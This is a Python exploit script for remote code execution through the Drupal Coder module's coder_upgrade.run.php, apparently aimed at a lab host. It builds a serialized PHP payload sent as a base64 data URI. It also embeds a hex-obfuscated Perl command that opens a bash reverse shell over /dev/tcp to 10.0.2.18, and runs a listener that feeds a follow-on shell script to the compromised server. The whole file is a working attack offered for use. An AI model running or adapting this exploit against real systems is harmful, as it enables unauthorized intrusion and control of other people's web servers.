from base64 import b64encode
import requests
import threading
import socket


class DrupalCoderExec:

    REV_SHELL = "perl -e 'system(pack(qq,H138,,qq,62617368202D632027303C2632342D3B657865632032343C3E2F6465762F7463702F31302E302E322E31382F35333631363B7368203C263234203E26323420323E26323427,))'"
    WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'

    def __init__(self, beachhead: str):
        self.beachhead = beachhead

    def create_payload(self, payload: str) -> str:
        p = ''
        p += 'a:6:{s:5:"paths";a:3:{s:12:"modules_base";s:8:"../../..";'
        p += 's:10:"files_base";s:5:"../..";s:14:"libraries_base";s:5:"../..";}'
        p += 's:11:"theme_cache";s:16:"theme_cache_test";'
        p += 's:9:"variables";s:14:"variables_test";'
        p += 's:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:3:"foo";}}'
        p += 's:10:"extensions";a:1:{s:3:"php";s:3:"php";}'
        p += 's:5:"items";a:1:{i:0;a:3:{s:7:"old_dir";s:12:"../../images";'
        p += 's:7:"new_dir";s:'
        p += str(len(payload) + 5)
        p += ':"-v;'
        p += payload
        p += ' #";s:4:"name";s:4:"test";}}}'

        pl = "data://text/plain;base64," + b64encode(bytes(p, 'utf-8')).decode('utf-8')
        return pl
    
    def send_beachhead(self, payload: str):
        HOST = ''
        PORT = 53616
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((HOST, PORT))
        sock.listen(1)
        conn, addr = sock.accept()
        conn.sendall(payload.encode('utf-8'))
        conn.sendall(b'\r\n')
        sock.close()

    def exploit(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
        thread = threading.Thread(target=self.send_beachhead, args=(self.beachhead,))
        thread.start()
        
        url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
        params = { 'file': self.create_payload(self.REV_SHELL) }
        requests.get(url=url, params=params)

        thread.join()


if __name__ == "__main__":
    with open ('Drupal_TEST.sh', 'r') as f:
        payload = f.read()
    coder_exec = DrupalCoderExec(payload)
    coder_exec.exploit('10.0.2.46', '80', '/drupal')